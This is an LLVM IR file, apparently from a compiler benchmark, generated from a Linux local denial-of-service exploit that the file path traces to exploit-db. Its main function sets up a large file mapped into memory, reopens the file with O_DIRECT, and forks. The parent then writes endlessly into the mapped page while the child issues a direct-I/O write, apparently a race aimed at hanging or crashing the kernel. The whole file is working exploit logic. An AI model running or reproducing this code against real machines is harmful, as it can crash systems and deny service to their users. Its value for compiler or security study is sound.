; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_26811.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_26811.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@FILENAME = common dso_local global i8* null, align 8
@O_RDWR = common dso_local global i32 0, align 4
@O_CREAT = common dso_local global i32 0, align 4
@O_LARGEFILE = common dso_local global i32 0, align 4
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@MAP_SHARED = common dso_local global i32 0, align 4
@MAP_FAILED = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [5 x i8] c"mmap\00", align 1
@O_DIRECT = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [14 x i8] c"write: %d %p\0A\00", align 1
@.str.2 = private unnamed_addr constant [6 x i8] c"write\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca [8192 x i8], align 16
  %11 = alloca i64, align 8
  %12 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i64 68719472640, i64* %11, align 8
  %13 = getelementptr inbounds [8192 x i8], [8192 x i8]* %10, i64 0, i64 0
  store i8* %13, i8** %12, align 8
  %14 = load i8*, i8** @FILENAME, align 8
  %15 = load i32, i32* @O_RDWR, align 4
  %16 = load i32, i32* @O_CREAT, align 4
  %17 = or i32 %15, %16
  %18 = load i32, i32* @O_LARGEFILE, align 4
  %19 = or i32 %17, %18
  %20 = call i32 @open(i8* %14, i32 %19, i32 420)
  store i32 %20, i32* %6, align 4
  %21 = load i32, i32* %6, align 4
  %22 = icmp slt i32 %21, 0
  br i1 %22, label %23, label %26

23:                                               ; preds = %2
  %24 = load i8*, i8** @FILENAME, align 8
  %25 = call i32 @perror(i8* %24)
  store i32 -1, i32* %3, align 4
  br label %82

26:                                               ; preds = %2
  %27 = load i32, i32* %6, align 4
  %28 = load i64, i64* %11, align 8
  %29 = add i64 %28, 16384
  %30 = call i32 @ftruncate64(i32 %27, i64 %29)
  %31 = load i32, i32* @PROT_READ, align 4
  %32 = load i32, i32* @PROT_WRITE, align 4
  %33 = or i32 %31, %32
  %34 = load i32, i32* @MAP_SHARED, align 4
  %35 = load i32, i32* %6, align 4
  %36 = load i64, i64* %11, align 8
  %37 = call i8* @mmap64(i32* null, i32 16384, i32 %33, i32 %34, i32 %35, i64 %36)
  store i8* %37, i8** %9, align 8
  %38 = load i8*, i8** %9, align 8
  %39 = load i8*, i8** @MAP_FAILED, align 8
  %40 = icmp eq i8* %38, %39
  br i1 %40, label %41, label %43

41:                                               ; preds = %26
  %42 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %82

43:                                               ; preds = %26
  %44 = load i8*, i8** @FILENAME, align 8
  %45 = load i32, i32* @O_RDWR, align 4
  %46 = load i32, i32* @O_DIRECT, align 4
  %47 = or i32 %45, %46
  %48 = load i32, i32* @O_LARGEFILE, align 4
  %49 = or i32 %47, %48
  %50 = call i32 @open(i8* %44, i32 %49, i32 420)
  store i32 %50, i32* %7, align 4
  %51 = load i32, i32* %6, align 4
  %52 = icmp slt i32 %51, 0
  br i1 %52, label %53, label %56

53:                                               ; preds = %43
  %54 = load i8*, i8** @FILENAME, align 8
  %55 = call i32 @perror(i8* %54)
  store i32 -1, i32* %3, align 4
  br label %82

56:                                               ; preds = %43
  %57 = load i8*, i8** %12, align 8
  %58 = ptrtoint i8* %57 to i64
  %59 = or i64 %58, 4095
  %60 = inttoptr i64 %59 to i8*
  %61 = getelementptr inbounds i8, i8* %60, i64 1
  store i8* %61, i8** %12, align 8
  %62 = call i64 (...) @fork()
  %63 = icmp ne i64 %62, 0
  br i1 %63, label %64, label %68

64:                                               ; preds = %56
  br label %65

65:                                               ; preds = %64, %65
  %66 = load i8*, i8** %9, align 8
  %67 = getelementptr inbounds i8, i8* %66, i64 10
  store i8 1, i8* %67, align 1
  br label %65

68:                                               ; preds = %56
  %69 = load i32, i32* %7, align 4
  %70 = load i8*, i8** %12, align 8
  %71 = load i64, i64* %11, align 8
  %72 = call i32 @pwrite64(i32 %69, i8* %70, i32 4096, i64 %71)
  store i32 %72, i32* %8, align 4
  %73 = load i32, i32* %8, align 4
  %74 = icmp slt i32 %73, 4096
  br i1 %74, label %75, label %80

75:                                               ; preds = %68
  %76 = load i32, i32* %8, align 4
  %77 = load i8*, i8** %12, align 8
  %78 = call i32 @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.1, i64 0, i64 0), i32 %76, i8* %77)
  %79 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %82

80:                                               ; preds = %68
  br label %81

81:                                               ; preds = %80
  store i32 0, i32* %3, align 4
  br label %82

82:                                               ; preds = %81, %75, %53, %41, %23
  %83 = load i32, i32* %3, align 4
  ret i32 %83
}

declare dso_local i32 @open(i8*, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @ftruncate64(i32, i64) #1

declare dso_local i8* @mmap64(i32*, i32, i32, i32, i32, i64) #1

declare dso_local i64 @fork(...) #1

declare dso_local i32 @pwrite64(i32, i8*, i32, i64) #1

declare dso_local i32 @printf(i8*, i32, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
